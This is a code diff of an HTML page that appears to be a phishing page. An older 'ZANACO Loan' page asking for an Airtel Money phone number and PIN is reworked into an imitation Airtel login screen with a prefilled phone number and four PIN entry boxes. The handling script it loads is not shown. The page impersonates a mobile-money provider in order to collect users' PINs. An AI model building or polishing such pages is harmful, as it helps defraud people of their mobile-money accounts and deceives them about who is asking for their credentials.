@@ -2,48 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <title>Airtel Login</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Money Login - ZANACO Loan</title>
     <link rel="stylesheet" href="assets/css/airtel.css">
 </head>
 <body>
-    <div class="container">
-        <div class="login-card">
-            <div class="logo-section">
-                <h1>ZANACO Loan</h1>
-                <p>Airtel Money Verification</p>
-            </div>
 
-            <form id="airtelForm" class="airtel-form">
-                <div class="form-group">
-                    <label for="airtelPhone">Airtel Phone Number</label>
-                    <input 
-                        type="tel" 
-                        id="airtelPhone" 
-                        name="airtelPhone" 
-                        placeholder="+260..."
-                        required
-                    >
-                </div>
+<div class="airtel-container">
+    <h1 class="airtel-logo">Airtel</h1>
 
-                <div class="form-group">
-                    <label for="airtelPin">Airtel Money PIN</label>
-                    <input 
-                        type="password" 
-                        id="airtelPin" 
-                        name="airtelPin" 
-                        placeholder="Enter 4-digit PIN"
-                        required
-                    >
-                </div>
+    <h2 class="welcome-text">Welcome</h2>
 
-                <button type="submit" class="btn-submit">Verify Account</button>
-            </form>
+    <input
+        type="text"
+        class="phone-input"
+        value="+260877458756"
+        readonly
+    />
 
-            <div id="message" class="message"></div>
-        </div>
+    <p class="pin-label">Enter your PIN</p>
+
+    <div class="pin-box">
+        <input type="password" maxlength="1" class="pin">
+        <input type="password" maxlength="1" class="pin">
+        <input type="password" maxlength="1" class="pin">
+        <input type="password" maxlength="1" class="pin">
     </div>
 
-    <script src="assets/js/airtel.js"></script>
+    <a href="#" class="forgot-pin">Forgot PIN?</a>
+
+    <button class="login-btn" disabled>Login</button>
+</div>
+
+<script src="assets/js/airtel.js"></script>
 </body>
 </html>
